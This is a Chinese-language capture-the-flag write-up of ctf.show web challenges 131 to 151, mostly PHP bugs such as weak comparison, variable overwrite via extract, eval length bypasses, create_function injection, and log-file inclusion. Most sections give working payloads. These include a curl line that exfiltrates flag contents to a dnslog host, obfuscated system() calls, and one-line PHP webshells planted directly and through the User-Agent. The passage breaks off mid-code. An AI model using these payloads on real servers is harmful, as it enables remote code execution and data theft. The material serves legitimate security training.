<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://27574079-8974-467c-bc5e-17d6b9cc7c6d.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211127175952923.png" alt="image-20211127175952923"></p>
<p>一看就是虚假的前端，robots协议泄露/admin，在网址后面输入/admin进入源码界面</p>
<p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20211127181844899.png" alt="image-20211127181844899"></p>
<ul>
<li>松散比较：<code>==</code>比较时先转数据类型再进行比较</li>
<li>严格比较：<code>===</code> 比较时先判断两种字符串类型是否相等，再进行比较<br>例：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || ture)</span><br></pre></td></tr></table></figure>

<p>因为 &amp;&amp; 的优先级大于 ||，所以就相当于 (false &amp;&amp; false) || ture，只要后边是true就行</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=admin&amp;password=<span class="number">1</span>&amp;code=admin</span><br></pre></td></tr></table></figure>

<p>不解释太清楚了，学到这里该懂了</p>
<h2 id="web133-无回显rce"><a href="#web133-无回显rce" class="headerlink" title="web133-无回显rce"></a>web133-无回显rce</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718801.png" alt="image-20211127185417656"></p>
<p>看代码</p>
<p>我们传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;sleep 3</span><br></pre></td></tr></table></figure>

<p>好像网站确实sleep了一会说明的确执行了命令</p>
<p>它先进行substr()函数截断, 经过substr($F,0,6)截取后 得到  `$F `;<br>然后去执行eval()函数,也就是会执行 eval(“`$F `;”);<br>这个函数的作用是执行php代码，是shell_exec()函数的缩写，然后就去命令执行。<br>而$F就是我们输入的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$F `;+sleep 3 </span><br></pre></td></tr></table></figure>

<p>所以最后执行的代码应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec(&quot;`$F `;sleep 3&quot;);</span><br></pre></td></tr></table></figure>

<p>就突破长度限制执行成功,由于无回显，利用curl去带出flag.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php&spm=1001.2101.3001.7020">php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：F=`<span class="variable">$F</span>`; curl `cat flag.php|grep <span class="string">&quot;flag&quot;</span>`.a0b651.dnslog.cn</span><br></pre></td></tr></table></figure>



<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302154737630.png" alt="image-20220302154737630"></p>
<p>parse_str() 函数把查询字符串解析到变量中。</p>
<p>$_SERVER[“QUERY_STRING”]</p>
<p>说明：查询(query)的字符串</p>
<p>extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>



<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718998.png" alt="image-20220302155428801"></p>
<p>web133加强版，过滤了curl，grep，之前的方法用不了</p>
<p>看了羽师傅博客发现没有限制写文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:F=`$F `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure>

<p>这个命令组合实现的效果就是将flag.php的内容复制到xxx文件中，访问/xxx即可得到flag</p>
<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185137867.png" alt="image-20220302185137867"></p>
<p>这道题135的基础上多过滤了 &gt;&lt;<br>但是linux中还可以用tee写文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|tee xxx</span><br></pre></td></tr></table></figure>

<p>我们先来看下当前目录下有啥文件，访问url/xxx发现只有一个index.php<br>那我们再去看看根目录下有什么文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /|tee xxx</span><br></pre></td></tr></table></figure>

<p>得到 f149_15_h3r3<br>最后直接打开就可以了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl  /f149_15_h3r3|tee xxx</span><br></pre></td></tr></table></figure>



<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185633851.png" alt="image-20220302185633851"></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line"></span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ctfshow=ctfshow::getflag</span><br></pre></td></tr></table></figure>



<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185911047.png" alt="image-20220302185911047"></p>
<p>同上一题，多过滤了冒号</p>
<p>call_user_func中不但可以传字符串也可以传数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">call_user_func(<span class="variable">$classname</span> .<span class="string">&#x27;::say_hello&#x27;</span>); <span class="comment">// As of 5.2.3</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myobject</span> = <span class="keyword">new</span> myclass();</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$myobject</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">Hello!</span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>



<h2 id="web139-脚本问题？？？"><a href="#web139-脚本问题？？？" class="headerlink" title="web139(脚本问题？？？)"></a>web139(脚本问题？？？)</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302190624722.png" alt="image-20220302190624722"></p>
<p>在136的基础上限制了写文件的权限，这时候可以考虑用盲打的方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AWK:是一种处理文本文件的语言，是一个强大的文本分析工具 </span><br><span class="line">NR:已经读出的记录数，就是行号，从1开始</span><br><span class="line"></span><br><span class="line">cut:命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</span><br><span class="line">-c ：以字符为单位进行分割。</span><br></pre></td></tr></table></figure>



<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718052.png" alt="image-20220302194944923"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>

<p>弱类型比较，只要让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo()) </span><br><span class="line">md5(sleep()) </span><br><span class="line">md5(md5()) </span><br><span class="line">current(localeconv) </span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的为数字所以我们改用sha1</span><br></pre></td></tr></table></figure>

<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：f1=md5&amp;f2=md5</span><br></pre></td></tr></table></figure>



<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718854.png" alt="image-20220302195947529"></p>
<p><code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>

<p>会发现无法执行命令的，但是php数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。<br>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&amp;v2=1&amp;v3=-phpinfo()-。</p>
<p>运行脚本构造system(‘tac f*’)得到 <code>(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>



<h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210048715.png" alt="image-20220302210048715"></p>
<p>0和0x0绕过 这里绕过因为是因为当成了8进制和16进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=0</span><br></pre></td></tr></table></figure>



<h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210319210.png" alt="image-20220302210319210"></p>
<p>过滤了加减我们还可以用乘除，过滤了~我们可以用异或构造命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)*&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png" alt="image-20220302212139253"></p>
<p>相比web141增加了对str的长度限制，但是完全没影响</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br></pre></td></tr></table></figure>



<h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png" alt="image-20220302212139253"></p>
<p>三元运算符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以执行命令，构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718920.png" alt="image-20220302213827488"></p>
<p>多增加了分号的过滤，不能用三目运算符，使用等号和位运算符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/image-20220303172712538.png" alt="image-20220303172712538"></p>
<table>
<thead>
<tr>
<th>\D</th>
<th>匹配一个非数字字符。等价于[^0-9]。grep要加上-P，perl正则支持</th>
</tr>
</thead>
<tbody><tr>
<td>\s</td>
<td>匹配任何不可见字符，包括空格、制表符、换页符等等。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>) </span><br><span class="line">类似于 </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;  </span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hint:在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>这段话告诉我怎么调用函数，creat_function第一个参数是参数，第二个参数是内容</p>
<p>我们通过闭合}来执行后面的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%5ccreate_function(&#x27;$a&#x27;,&#x27;return 111;&#125;system(&#x27;tac f*&#x27;);//&#x27;)</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="keyword">GET</span> ?show=echo <span class="number">111</span>;&#125;;<span class="keyword">system</span>(<span class="comment">&#x27;tac f*&#x27;);//</span></span><br><span class="line">POST ctf=%<span class="number">5</span>ccreate_function</span><br></pre></td></tr></table></figure>



<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718694.png" alt="image-20220303175202944"></p>
<p>看到payload的我一脸懵，使用中文异或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure>

<p>这个我不会，但是^没有过滤，我可以直接异或构造</p>
<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718804.png" alt="image-20220303184731286"></p>
<p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
<p>写入一句话。进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">ctf=index.php</span><br><span class="line">show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">      <span class="variable">$class</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先访问index.php 修改user_agent为&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">isVIP=<span class="number">1</span></span><br><span class="line"><span class="number">1</span>=<span class="keyword">system</span>(<span class="string">&quot;tac f*&quot;</span>);&amp;ctf=/var/<span class="keyword">log</span>/nginx/access.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>



<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">      <span class="variable">$class</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">  <span 